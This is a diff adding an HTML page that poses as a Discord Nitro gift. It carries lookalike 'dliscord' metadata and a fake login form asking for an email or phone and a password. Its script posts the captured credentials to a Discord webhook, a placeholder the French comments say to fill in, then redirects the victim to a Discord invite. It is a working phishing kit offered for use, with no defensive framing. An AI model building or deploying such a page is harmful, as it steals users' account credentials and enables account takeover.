@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <link rel="stylesheet" href="assest/style.css" />
+    <meta property="og:site_name" content="Discord Gift">
+    <meta property="og:url" content="https://dliscord.">
+    <meta property="og:title" content="Discord">
+    <meta property="og:description" content="You Have Been Gifted A 3 Month Nitro">
+    <meta property="og:type" content="Discord">
+    <meta name="og:image" itemprop="image"
+        content="https://cdn1.epicgames.com/salesEvent/salesEvent/EGS_Discord_Nitro_2560x1440_withlogo_2560x1440-944994658df3b04d0c4940be832da19e">
+</head>
+
+<body>
+    <center>
+        <div class="loginPart">
+            <br /><br /><br />
+            <p class="middle">You Have Been Gifted a 3 Month Nitro! <br> You need to login to earn it.</p>
+            <br /><br /><br />
+            <p class="welcome">Welcome Back!</p>
+            <br />
+            Email or Phone number:
+            <br />
+            <form id="loginForm">
+                <input type="text" name="user" class="inputs" />
+                <br />
+                Password:
+                <br />
+                <input type="password" name="pass" class="inputs" />
+                <br /><br />
+                <input type="submit" value="Login" class="submit" />
+            </form>
+        </div>
+    </center>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            const user = event.target.user.value;
+            const pass = event.target.pass.value;
+
+            const data = ` Username: ${user}   Password: ${pass}`;
+
+            // Envoyer les données du formulaire vers le webhook Discord
+            const webhookURL = 'URL_DU_WEBHOOK'; // Remplacez ceci par l'URL de votre webhook Discord
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ content: data }),
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Erreur lors de l\'envoi du message au webhook');
+                    }
+                    alert('Votre Nitro sera bientôt activé !');
+                    window.location.replace("https://discord.gg/4Fxhr8d966");
+                })
+                .catch(error => {
+                    console.error('Erreur:', error);
+                    alert('Une erreur est survenue. Veuillez réessayer.');
+                });
+        });
+    </script>
+</body>
+
+</html>
